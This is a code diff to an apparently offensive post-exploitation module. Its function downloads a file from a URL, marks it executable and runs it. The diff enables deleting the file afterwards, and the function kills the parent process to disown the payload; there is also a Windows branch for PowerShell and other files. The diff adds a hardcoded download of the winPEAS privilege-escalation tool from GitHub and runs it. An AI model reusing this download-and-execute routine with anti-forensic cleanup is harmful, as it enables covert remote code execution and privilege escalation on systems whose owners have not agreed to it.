@@ -26,12 +26,12 @@ def http_get_andcute(url):
         print(f"Downloading {url} to {proc_path}{proc_name}")
 
         # Download
-        file.write(f"{proc_path}{proc_name}", http.get(url))
+        http.download(url, f"{proc_path}{proc_name}")
         sys.shell(f"chmod +x {proc_path}{proc_name}")
         # Execute
         sys.exec(f"{proc_path}{proc_name}", [], True)
         # Cleanup
-        # file.remove(f"{proc_path}{proc_name}")
+        file.remove(f"{proc_path}{proc_name}")
 
         # Kill parent process for clean disown
         ppid = get_parent_process(proc_name)
@@ -50,8 +50,7 @@ def http_get_andcute(url):
 
         # Download
         print(f"Downloading {url} to {proc_path}{proc_name}{ext}")
-        payload = http.get(url)
-        file.write(f"{proc_path}{proc_name}{ext}", payload)
+        http.download(url, f"{proc_path}{proc_name}{ext}")
 
         # Execute
         if ext == ".ps1":
@@ -67,4 +66,6 @@ def http_get_andcute(url):
         return
 
 
+input_params = {
+    "url": "https://github.com/peass-ng/PEASS-ng/releases/download/20250112-c19ae6c3/winPEASany.exe"}
 http_get_andcute(input_params['url'])
